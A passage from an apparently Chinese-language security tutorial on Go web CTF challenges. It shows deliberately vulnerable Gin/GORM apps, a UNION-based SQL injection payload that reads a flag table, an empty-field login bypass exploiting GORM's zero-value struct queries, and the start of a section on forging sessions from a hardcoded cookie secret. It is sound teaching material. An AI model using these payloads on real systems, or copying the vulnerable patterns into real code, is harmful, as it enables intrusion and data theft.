(1,2,3);</span>db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> <span class="token string">"name = ?"</span><span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token comment">// SELECT * FROM users WHERE NAME= "admin"</span></code></pre><h3 id="3-1-SQL-注入"><a href="#3-1-SQL-注入" class="headerlink" title="3.1 SQL 注入"></a>3.1 SQL 注入</h3><p>可以看到, 对于 First, Find 这些⽅法, GORM 提供了⾼度的灵活性, ⽅法传⼊的第⼆个参数既可以是数字&#x2F;字符串, 也可以是⼀个 Map 对象, 甚⾄是复杂的查询条件</p><p>根据 GORM 的官⽅⽂档, 这些⽅法的使⽤也存在着⼀些隐患, 如果使⽤不当则会造成 SQL 注⼊</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token comment">// 会被转义</span>db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> <span class="token string">"name = ?"</span><span class="token punctuation">,</span> userInput<span class="token punctuation">)</span><span class="token comment">// SQL 注⼊</span>db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"name = %v"</span><span class="token punctuation">,</span> userInput<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>eg.</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"os"</span>    <span class="token string">"github.com/gin-gonic/gin"</span>    <span class="token string">"gorm.io/driver/sqlite"</span>    <span class="token string">"gorm.io/gorm"</span><span class="token punctuation">)</span><span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    ID       <span class="token builtin">int</span> <span class="token string">`gorm:"primaryKey"`</span>    Username <span class="token builtin">string</span>    Email    <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> Flag <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    Flag <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> db <span class="token operator">*</span>gorm<span class="token punctuation">.</span>DB<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    db<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> gorm<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>sqlite<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>gorm<span class="token punctuation">.</span>Config<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">AutoMigrate</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">AutoMigrate</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Flag<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Username<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"admin@admin.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Username<span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"test@test.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Username<span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"guest@guest.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Flag<span class="token punctuation">&#123;</span>Flag<span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"helloworld"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">QueryHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    id <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> user User        db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> id<span class="token punctuation">)</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>Username<span class="token punctuation">,</span>            <span class="token string">"email"</span><span class="token punctuation">:</span>    user<span class="token punctuation">.</span>Email<span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"no query id"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/query"</span><span class="token punctuation">,</span> QueryHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>程序的 &#x2F;query 路由通过传⼊的 id 进⾏ User 数据的查询, 尽管使⽤了 GORM 框架,</p><p>但因为 id 并没有限制为 int 类型, 所以在这⾥也可以理解为传⼊的是⼀个 name &#x3D; xxx 或者其它的查询条件, 存在 SQL 注⼊的⻛险</p><p>Payload：</p><pre class="language-none"><code class="language-none">&#x2F;query?id&#x3D;id&#x3D;1 union select 1,sqlite_version(),(select flag from flags) --+</code></pre><h3 id="3-2-权限绕过"><a href="#3-2-权限绕过" class="headerlink" title="3.2 权限绕过"></a>3.2 权限绕过</h3><p>GORM 的 Where ⽅法⽀持传⼊ Struct &#x2F; Map 进⾏查询</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token comment">// Struct</span>db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"jinzhu"</span><span class="token punctuation">,</span> Age<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span><span class="token comment">// SELECT * FROM users WHERE name = "jinzhu" AND age = 20 ORDER BY id LIMIT 1;</span><span class="token comment">// Map</span>db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"jinzhu"</span><span class="token punctuation">,</span> <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>users<span class="token punctuation">)</span><span class="token comment">// SELECT * FROM users WHERE name = "jinzhu" AND age = 20;</span><span class="token comment">// Slice of primary keys</span>db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">&#123;</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>users<span class="token punctuation">)</span><span class="token comment">// SELECT * FROM users WHERE id IN (20, 21, 22);</span></code></pre><p>但是对于 Struct 的查询, GORM 只会查询 “⾮零字段”, 即如果 Struct 内的某个字段值为 0 , ‘’ , false , GORM 则不会使⽤该字段构建查询条件</p><p><img src="image-1.png" alt="image-1.png"></p><p>这在某些情况下, 可能会造成 “权限绕过”</p><p>eg.</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"crypto/md5"</span>    <span class="token string">"crypto/rand"</span>    <span class="token string">"fmt"</span>    <span class="token string">"os"</span>    <span class="token string">"github.com/gin-contrib/sessions"</span>    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>    <span class="token string">"github.com/gin-gonic/gin"</span>    <span class="token string">"gorm.io/driver/sqlite"</span>    <span class="token string">"gorm.io/gorm"</span><span class="token punctuation">)</span><span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    ID       <span class="token builtin">int</span> <span class="token string">`gorm:"primaryKey"`</span>    Username <span class="token builtin">string</span>    Password <span class="token builtin">string</span>    Role     <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> db <span class="token operator">*</span>gorm<span class="token punctuation">.</span>DB<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    randBytes <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>    rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>randBytes<span class="token punctuation">)</span>    h <span class="token operator">:=</span> md5<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span>randBytes<span class="token punctuation">)</span>    randPassword <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span>    db<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> gorm<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>sqlite<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>gorm<span class="token punctuation">.</span>Config<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">AutoMigrate</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Username<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> Password<span class="token punctuation">:</span> randPassword<span class="token punctuation">,</span> Role<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Username<span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> Password<span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> Role<span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"helloworld"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">LoginHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> user User    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    username <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    password <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>    result <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Username<span class="token punctuation">:</span> username<span class="token punctuation">,</span> Password<span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span>    <span class="token keyword">if</span> result<span class="token punctuation">.</span>Error <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"error"</span><span class="token punctuation">:</span> result<span class="token punctuation">.</span>Error<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span>Role<span class="token punctuation">)</span>    session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"login as "</span> <span class="token operator">+</span> user<span class="token punctuation">.</span>Username <span class="token operator">+</span> <span class="token string">" success"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    role <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"unauthorized"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token punctuation">&#123;</span>        flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"welcome admin"</span><span class="token punctuation">,</span>            <span class="token string">"flag"</span><span class="token punctuation">:</span>    <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"only admin can get flag"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    secret <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> LoginHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>题⽬数据库存在 admin 和 guest 两个账户, 但是 admin 的密码为随机的 md5, ⽆法直</p><p>接登录, 我们仅拥有 guest 的账号密码</p><p><code>/flag</code> 路由限制只有 role 为 admin 时才能查看 flag</p><p><code>/login</code> 路由⽤于处理⽤户登录, 注意到这⼀句</p><pre class="language-go" data-language="go"><code class="language-go">result <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Username<span class="token punctuation">:</span> username<span class="token punctuation">,</span> Password<span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span></code></pre><p>Where ⽅法中传⼊了⼀个 User 结构体, 其 Username 和 Password 的值通过 post ⽅法传⼊</p><p>结合上⾯的知识点, 我们可以构造⼀些 “零值”, 使得在未知 admin 密码的情况下, 让数据库查询出 admin 账户, 从⽽成功登录</p><p><code>username=&amp;password=</code> , 即 username 和 password 都为空, 这种情况下数据库将会返回 users 表中的第⼀个⽤户 admin</p><p><code>username=admin&amp;password=</code> , 仅 password 为空, 那么这时候构建的 SQL 语句就相当于 <code>SELECT * FROM users WHERE username = &quot;admin&quot;</code> , 将会返回 admin 的数据</p><h2 id="4-Gin-相关"><a href="#4-Gin-相关" class="headerlink" title="4. Gin 相关"></a>4. Gin 相关</h2><p>Gin 框架使⽤ gin-contrib&#x2F;sessions 作为 session 中间件, ⽽ gin-contrib&#x2F;session 实际基于 gorilla&#x2F;session , 其使⽤了 gorilla&#x2F;securecookie 对 cookie 进⾏签名或加密</p><p>gorilla&#x2F;securecookie ⽤于产⽣⼀个 “安全的 cookie”, 它⽀持使⽤ HMAC 对 cookie 进⾏签名, 或者使⽤ AES 算法对 cookie 进⾏加密, cookie 的内容默认使⽤ gob (Go Binary) 格式进⾏序列化</p><p>默认 gin-contrib&#x2F;sessions 仅对 session 进⾏签名, 在使⽤ session 时需要指定⼀个⽤于签名的 secret</p><p>这种情况可以类⽐ flask 的客户端 session, 即 session 可能会泄露敏感信息, 且当 secret 已知时, 可以伪造 session</p><p>eg.</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"os"</span>    <span class="token string">"github.com/gin-contrib/sessions"</span>    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    role <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"welcome "</span> <span class="token operator">+</span> role<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    role <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"unauthorized"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token punctuation">&#123;</span>        flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"welcome admin"</span><span class="token punctuation">,</span>            <span class="token string">"flag"</span><span class="token punctuation">:</span>    <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"only admin can get flag"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"Th1s_1s_a_S3cret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token 